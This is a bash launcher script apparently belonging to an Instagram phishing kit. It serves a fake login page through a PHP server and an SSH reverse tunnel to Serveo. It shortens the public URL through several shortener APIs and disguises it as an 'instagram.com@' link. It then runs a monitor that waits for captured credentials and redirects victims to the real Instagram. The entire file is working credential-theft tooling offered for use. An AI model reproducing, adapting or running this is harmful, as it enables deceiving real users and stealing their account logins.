#!/bin/bash

# ================================================
#  Serveo Tunnel Manager with Link Masking
# ================================================

echo -e "\e[1;33m[ Serveo Tunnel Configuration ]\e[0m"

# Get SSH key path
read -p "Enter path to SSH private key: " ssh_key
if [ ! -f "$ssh_key" ]; then
    echo -e "\e[31m[!] SSH key not found. Generating new one...\e[0m"
    ssh-keygen -t rsa -b 4096 -f "$HOME/.ssh/instaphish_serveo" -N "" -q
    ssh_key="$HOME/.ssh/instaphish_serveo"
    echo -e "\e[32m[+] New SSH key generated: $ssh_key\e[0m"
    echo -e "\e[33m[!] Add this public key to your Serveo allowed hosts.\e[0m"
fi

chmod 600 "$ssh_key"

# Subdomain configuration
read -p "Use custom subdomain? (y/n): " custom_sub
if [ "$custom_sub" = "y" ]; then
    read -p "Enter subdomain: " subdomain
else
    subdomain=$(cat /dev/urandom | tr -dc 'a-z0-9' | fold -w 10 | head -n 1)
fi

# Local port
read -p "Enter local PHP server port [8080]: " local_port
local_port=${local_port:-8080}

# Landing page configuration
echo -e "\n\e[1;33m[ Landing Page Configuration ]\e[0m"
echo "Where to redirect after successful credential capture?"
read -p "Landing URL [https://www.instagram.com/]: " landing_url
landing_url=${landing_url:-"https://www.instagram.com/"}

# Start PHP server
echo -e "\e[32m[+] Starting PHP server on port $local_port...\e[0m"
php -S 127.0.0.1:$local_port -t ../ > /dev/null 2>&1 &
php_pid=$!
sleep 2

# Start Serveo tunnel
echo -e "\e[32m[+] Establishing Serveo tunnel...\e[0m"
ssh -i "$ssh_key" \
    -o StrictHostKeyChecking=no \
    -o UserKnownHostsFile=/dev/null \
    -o ServerAliveInterval=60 \
    -o TCPKeepAlive=yes \
    -R "${subdomain}:80:127.0.0.1:${local_port}" \
    serveo.net &

tunnel_pid=$!
sleep 3

serveo_url="https://${subdomain}.serveo.net"
echo -e "\e[1;32m[+] Tunnel established: $serveo_url\e[0m"

# Integrated Link Shortener with multiple API fallback
echo -e "\n\e[1;33m[ Generating Shortened & Masked Link ]\e[0m"

# Full URL with redirect parameter
full_url="${serveo_url}/?redirect=$(python3 -c "import urllib.parse; print(urllib.parse.quote('${landing_url}'))")"

# Try multiple shorteners
shortened=""
apis=(
    "https://is.gd/create.php?format=simple&url=${full_url}"
    "https://tinyurl.com/api-create.php?url=${full_url}"
    "https://vgd.com/shorten.php?url=${full_url}"
)

for api in "${apis[@]}"; do
    shortened=$(curl -s --max-time 5 "$api" | grep -Eo 'https?://[^ ]+')
    if [ -n "$shortened" ] && [ ${#shortened} -lt 100 ]; then
        break
    fi
done

if [ -z "$shortened" ]; then
    shortened="$serveo_url"
    echo -e "\e[33m[!] Shorteners unreachable. Using direct URL.\e[0m"
fi

# Create masked phishing link
short_code=$(echo "$shortened" | sed 's|https://||')
masked_link="instagram.com@${short_code#https://}"

echo -e "\n\e[1;32m========================================\e[0m"
echo -e "\e[1;32m  Masked Phishing Link:\e[0m"
echo -e "\e[1;37m  ${masked_link}\e[0m"
echo -e "\e[1;32m========================================\e[0m"

# Start credential monitor
echo -e "\n\e[1;33m[ Starting Real-time Credential Monitor ]\e[0m"
python3 ../server/monitor.py &
monitor_pid=$!

echo -e "\e[32m[+] All systems active. Waiting for credentials...\e[0m"
echo -e "\e[33m[!] Press Ctrl+C to stop all services.\e[0m"

# Cleanup on exit
trap "kill $php_pid $tunnel_pid $monitor_pid 2>/dev/null; echo -e '\n\e[31m[!] Shutting down...\e[0m'; exit 0" INT TERM

wait